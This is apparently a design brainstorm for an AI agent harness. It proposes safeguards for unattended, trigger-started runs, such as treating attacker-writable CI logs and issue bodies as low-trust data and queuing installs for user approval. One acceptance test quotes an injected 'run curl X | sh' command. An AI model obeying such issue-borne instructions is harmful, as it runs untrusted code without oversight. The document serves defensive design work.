# Brainstorm — lens: grid

Surfaces: CLI verbs (`sampo`/`fm`), the drive, hooks, the web UI/pane, Smith TUI, and the site. Actors: user, agent, other agents (CI, issue authors, sibling harnesses), unattended run. Cells are named as surface × actor × failure.

- **Fence trigger-borne text as data with a lower grant tier** — SECURITY — value 5 — effort M — risk low — category: trigger safety
  Cell: unattended run × other agents' text × unsafe. CI logs and issue bodies are attacker-writable, and a triggered run has no human watching. Cap triggered runs at "no outward action, no installs, Ward at its strictest". Everything beyond that queues for a yes.
  Why: the pack asks for "installs queued for one yes"; the injection-defense backlog (T-0791) is deferred.
  Done when: a test issue body saying "run curl X | sh" produces a queued item and no executed command.

- **Add a trigger loop breaker with a provenance chain** — SECURITY — value 4 — effort S — risk low — category: trigger safety
  Cell: other agents × unattended × unsafe. A fix pushes a commit, CI fails, the watcher fires, and the cycle repeats. Each triggered session carries a chain id and depth. The same trigger can't re-fire on its own descendants' events, and Sampo's own state writes never re-trigger file watchers.
  Why: assumption: self-triggering without this loops. Related: "drive re-pushes" fixes T-2901.
  Done when: a fixture where a fix retriggers its own CI stops at depth 2 and records why.

- **Stamp every self-started session with its wake reason** — FEATURE — value 4 — effort S — risk low — category: clarity
  Cell: agent × (hook/session start) × unclear. The first line reads "started by trigger T, event E, authority tier, budget left". This stops the model treating the run as a user ask or inventing intent.
  Why: the user's steers about misread asks; assumption: the session otherwise sees an unexplained prompt.
  Done when: a triggered session's first context line carries trigger id and tier, and a test greps for it.

- **Catch up missed schedules once on drive start** — FIX — value 4 — effort M — risk med — category: scheduling
  Cell: drive × unattended × missing. If the machine slept or the drive stopped, schedules silently skip. On start, compute missed fires, run the newest one per trigger, and log the skipped ones.
  Why: drive stops appeared (0→0.1); the user wants overnight progress.
  Done when: simulating a 6-hour gap yields one catch-up run per schedule and a ledger line listing the skipped fires.

- **Type every drive stop and auto-resume the transient ones** — FIX — value 5 — effort M — risk med — category: reliability
  Cell: drive × unattended × unclear/wrong. A stop reason enum (usage limit, phantom-held agent, endpoint cold, tool failure storm, user-only grant) goes into the morning card. Transient reasons resume with backoff, and the rest wait with a named unblocker.
  Why: the "drive stops" metric rose from 0 to 0.1; T-2900 and T-2901 are phantom-hold fixes.
  Done when: every stop in the ledger has a non-"unknown" reason, and a planted transient stop resumes without a prompt.

- **Preflight triggered runs with a tool canary** — FIX — value 4 — effort S — risk low — category: reliability
  Cell: agent × unattended × wrong. Before a triggered run starts, check that the worktree resolves state, the local endpoint answers, and the verbs it needs exist. Classify failed calls by cause. If preflight fails, don't start.
  Why: failed tool calls are up by half.
  Done when: a deliberately broken worktree causes a logged "not started: reason" instead of a run full of failed calls.

- **Queue local-model volume work by resident model** — PERFORMANCE — value 4 — effort M — risk med — category: local models
  Cell: unattended × slow. Triage, CI-log summarising, and issue dedupe go to the local qwen3.8-27b profile in one batch. Frontier escalation happens only on failure or disagreement. Avoid the 3-minute swap by never switching mid-batch.
  Why: the user wants "local models used without limit for background volume"; the swap cost is in the steers.
  Done when: a night of 50 events causes at most one model swap, and the ledger shows the frontier tokens spent.

- **Deduplicate CI failures by signature and pre-fetch the red** — FEATURE — value 4 — effort M — risk low — category: CI watcher
  Cell: CI/other agents × unattended × wrong. A failing check becomes one red-first task keyed by test name plus failure hash, with the log excerpt attached. Ten reruns of the same failure don't make ten tasks.
  Why: assumption: CI watching without dedupe floods the queue.
  Done when: replaying the same failure 5 times yields one open task with a count of 5.

- **Make one "Overnight yes" card for queued installs and risky triggers** — FEATURE — value 5 — effort M — risk low — category: approvals
  Cell: user × (web UI/phone) × unclear. Each queued item shows source, hash, size, and what runs. One yes applies all, per-line strike-through is available, and nothing is ever prompted mid-run.
  Why: the request says "installs queued for one yes"; the steer says never interrupt the user.
  Done when: three queued installs are approved with one action and each records its hash.

- **Show a trigger timeline with "would have fired" dry-run** — FEATURE — value 4 — effort M — risk low — category: observability
  Cell: web UI × user × missing/unclear. It lists fired, skipped (why), and dry-run triggers. A new trigger defaults to dry-run for 24 hours.
  Why: assumption: users won't trust unattended starts without seeing near-misses.
  Done when: a new trigger shows dry-run events, and one key promotes it to live.

- **Debounce and ignore-list file triggers** — PERFORMANCE — value 3 — effort S — risk low — category: file triggers
  Cell: CLI/hooks × unattended × slow. A coalescing window plus an ignore list (`.sampo`, `node_modules`, lane worktrees) keeps a save burst from firing 40 runs.
  Why: assumption: the 2.4 GB state and worktrees generate event noise.
  Done when: 200 writes in 2 s fire once.

- **Wild: Compile a one-sentence trigger via a local model** — FEATURE — wild — value 4 — effort M — risk med — category: authoring
  Cell: user × CLI × unclear. "When main goes red, fix it unless it touches the guard" becomes a trigger, predicate, tier and budget. It is shown as a diff for one yes and rejected if it can't be dry-run.
  Done when: five sentences compile and the unparseable ones are refused with a reason.

- **Wild: Treat a sibling harness finishing as an event** — FEATURE — wild — value 3 — effort L — risk med — category: other agents
  Cell: other agents × unattended × missing. When a Codex or Gemini session in another terminal ends, a cold review lane starts on its diff using a different model.
  Done when: a finished fixture session spawns a review task referencing its commit.

- **Wild: Replay a recorded week of events into a scratch tree** — FEATURE — wild — value 4 — effort L — risk low — category: testing
  Cell: unattended × unsafe/wrong. Recorded CI and issue payloads, including hostile ones, replay through the trigger layer in a sandbox, and the tier and fence outcomes are scored.
  Done when: the replay corpus passes with zero executed outward actions.

Empty cells: Smith TUI × any failure (no trigger path reaches it yet), and site × agent (the site is read-only and presents no trigger surface). The user × slow cell is covered by local batching.

Next question: What does the user's first morning card need to show to decide, in 10 seconds, whether the night's unattended work is trustworthy?
Next question: Which trigger kind (schedule, file, CI, issue) has the lowest ratio of wrong starts to useful starts in the user's own repos, and is that measured anywhere?
